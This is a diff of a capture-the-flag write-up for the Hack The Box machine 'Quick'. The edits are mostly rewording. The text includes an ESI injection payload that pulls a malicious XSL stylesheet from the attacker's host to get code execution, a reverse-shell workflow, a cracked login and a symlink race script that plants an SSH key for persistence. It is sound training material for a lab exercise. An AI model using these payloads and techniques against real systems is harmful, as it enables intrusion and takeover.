@@ -70,7 +70,7 @@ There's text that states _We are migrating our portal with latest TLS and HTTP s
 
 #### Connecting
 
-We know from our earlier nmap scan that port 443 isn't open. Given that the challenge is named quick, and the little
+We know from our earlier nmap scan that port 443 isn't open. Given that the box is named quick, and the little
 snippet talks about the latest TLS and HTTP support, perhaps it's referring to http/3, which uses [QUIC](https://en.wikipedia.org/wiki/QUIC).  It uses
 UDP so lets use nmap to check.
 
@@ -180,20 +180,18 @@ We can make a ticket with an idea that we can later search. The ticket ID is TKT
 
 #### search.php
 
-Given a ticket ID we can search with the ticket id as part of the url parameter. Seems to allow all kinds of tags and XSS but can't seem to make any request hit my server. However, if
+Given a ticket ID we can search with the ticket id as part of the url parameter. Seems to allow all kinds of tags and XSS but can't seem to make any request hit my server. However, we know from our previous research that if we can reflect a tag, we can exploit esigate.
 
 #### esigate
 
-Now that we have the ability to reflect tags, we can take advantage of the vulnerability in esigate(https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/). We need to sign in, run our local server to serve up the
-`evil.xsl` file, and submit this payload:
+Now to take advantage of the vulnerability in esigate(https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/).  There's a number of moving parts here. First we need to sign in, run our local server to serve up the `evil.xsl` file, and submit this payload as a ticket description:
 
 ```xml
 <esi:include src="http://127.0.0.1:9001/index.php" stylesheet="http://10.10.14.39.com/quick/evil.xsl">
 </esi:include>
 ```
 
-Then we need to make the request to search.php with the appropriate TKT number. This initiates the request to our local server, which serves the `evil.xsl`, which makes the
-call to java's exec, giving us RCE. Once we have RCE, we can try netcat but it doesn't seem the `-e` switch works. So lets upload/download a python script for a reverse shell, and then run it. Don't forget to setup the netcat listener, and be running a local server to serve the `evil.xsl` file and the python reverse shell. This script will automate most of the process, but you may need to alter the paths to get it to work.
+Then we need to make the request to `search.php` with the appropriate TKT number so that esigate processes the reflected tags. This initiates the request to our local server, which serves the `evil.xsl`, which makes the call to java's exec, giving us RCE. Once we have RCE, we can try netcat but it doesn't seem the `-e` switch works? I was unable to get the python reverse shell to run directly(probably some encoding thing), so lets upload/download a python script and then run it. Don't forget to setup the netcat listener, and be running a local server to serve the `evil.xsl` file and the python reverse shell. This script will automate most of the process, but you may need to alter the paths to get it to work.
 
 ```bash
 #!/bin/sh
@@ -258,17 +256,34 @@ Command: <xsl:value-of select="$cmd"/>
 </xsl:stylesheet>
 ```
 
-If done properly we should now have a reverse shell.
+If everything went to plan, we should now have a reverse shell.
 
 #### reverse shell and owning user
 
-Looking around we find we're the `sam` user, and `user.txt` is in the home directory. Let's add a public key to `.ssh/authorized_keys` so we can just ssh in.
+Looking around we find we're the `sam` user, and `user.txt` is in the home directory. Let's add a public key to `~/.ssh/authorized_keys` so we can just ssh in.
 
 ## User2 and Root
 
 ### Enum
 
-Running `linpeas.sh` we notice some interesting code in `/var/www/printer`. Let's investigate.
+Running `linpeas.sh` we notice some interesting code in `/var/www/printer`.
+
+```php
+[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+...
+/var/www/printer/add_printer.php:        echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
+/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:                if ($this -> userPassword == null) {
+/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:            if ($this -> userPassword == null) {
+/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:        $this -> userPassword = null;
+/var/www/printer/escpos-php/src/Mike42/Escpos/PrintConnectors/WindowsPrintConnector.php:                    $this -> userPassword = $part['pass'];
+/var/www/printer/home.php:        echo '<script>alert("Invalid Username/Password");window.location.href="/index.php";</script>';
+/var/www/printer/index.php:<input type="password" name="password" class="form-control" id="exampleInputPassword1">
+/var/www/printer/index.php:        $password = md5(crypt($password,'fa'));
+/var/www/printer/index.php:        $password = $_POST["password"];
+/var/www/printer/index.php:        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
+/var/www/printer/job.php:	echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
+/var/www/printer/printers.php:        echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
+```
 
 Trying to figure out how to access this printer site, let's check out the apache config
 
@@ -317,12 +332,11 @@ sam@quick:/etc/apache2/sites-enabled$ cat 000-default.conf
 
 ```
 
-Looking at the config, and the contents of `/var/www/html` we see that the contents are what's available via port 9001 externally. So let's add the host to our
-`/etc/hosts`, and we find that we can access `http://printerv2.quick.htb:9001/`.
+Looking at the config, we see it's running as svradm, and find a new virtual host, `printerv2.quick.htb`. So let's add the host to our `/etc/hosts`, and when we access `http://printerv2.quick.htb:9001/`, we find it serves the files we found in `/var/www/printer`.
 
 ### printerv2.quick.htb
 
-In `index.php` we can find the following login code
+In `index.php` we find the following login code
 
 ```php
 include("db.php");
@@ -349,7 +363,7 @@ if(isset($_POST["email"]) && isset($_POST["password"]))
 }
 ```
 
-We find the credentials in db.php:
+We find database credentials in db.php:
 
 ```php
 <?php
@@ -445,7 +459,7 @@ Tries 1100000, 224467
 yl51pbx
 ```
 
-Then we can login with `srvadm@quick.htb:yl51pbx`.
+Now we can login with `srvadm@quick.htb:yl51pbx`.
 
 #### Quick POS Print Server (owning srvadm)
 
@@ -469,7 +483,7 @@ if($_SESSION["loggedin"])
 
 The script calls `file_put_contents`, writing the `desc` value into it. The `/var/www/jobs` directory is world-writeable so we can create a symlink into whatever
 file we want, and have the server write what we want into it. Let's write a public ssh key into `/home/srvadm/.ssh/authorized_keys`. We'll need to create
-a script to create the symlink and then make the call to the server quickly since the filename is based on the time, and includes the seconds value.  You'll need to replace public key in the script with your own, don't forget to url encode.
+a script to create the symlink and then make the call to the server quickly since the filename is based on the time, and includes the seconds value.  You'll need to replace the public key in the script with your own, don't forget to url encode.
 
 ```bash
 #!/bin/sh
@@ -482,7 +496,7 @@ ln -s /home/srvadm/.ssh/authorized_keys "/var/www/jobs/${filename}"
 curl 'http://localhost/job.php' -H 'Host: printerv2.quick.htb' -H "Cookie: PHPSESSID=${sess}" --data 'title=Port+8081&desc=ssh%2Drsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQDIxJfGA7%2F0W9izQKEb87wTkKw3Ko83AIjcDw%2BScukapOKIYZ%2FN16ApuuC3TeFuSBrWtiIY1ZY7b35pnXsYg9zju6bb%2Fv3Qz9EBAdepxE9yjJY6yzylCUjm%2Fm%2B2vUKdnMYYMfwCmaL9EgJfXsvom6x1oZ%2BdIjykB57PyoX53P0hZ%2B1Irz3IY5xqc8einuP0X%2F50vuT42XnqRQSvCLAar2E6LPWfUc0l4GoN7lhM7l8eZ6v9Qn0Rj%2FpDLDIxf4UL4o3FdLSiV4is%2F4G1SHe5i0IUWtRmW%2BUR3h%2Bxi5Ujh7L7Xhxr99WacvIg6SydVRndBh2fC3zZKTobZDwPNR43R9MI8hSFclPo2t4kKgFn5ywd16qUDD2B%2BUtKUt%2Famotpgq8TVRVaTjICbVrJA1TEmEDO%2BNV1zo%2B6Ym5%2BHJEd8E%2Blg%2FkuhP2%2BLNJ7e39SaNDzc7coL%2F0ZCxQieu6tteVcNotUlUBGRhJo2T4vPjIGX4IydWkjcPg6WFFG%2FWUhANYMSnc%3D&submit=yup' & > /dev/null 2>&1
 ```
 
-If everything went well we should be able to ssh into the `srvadm` user. Let's script our way back in, in case we need to do it again:
+If everything went well we should be able to ssh into the `srvadm` user.
 
 ## Enum as srvadm and owning root
 
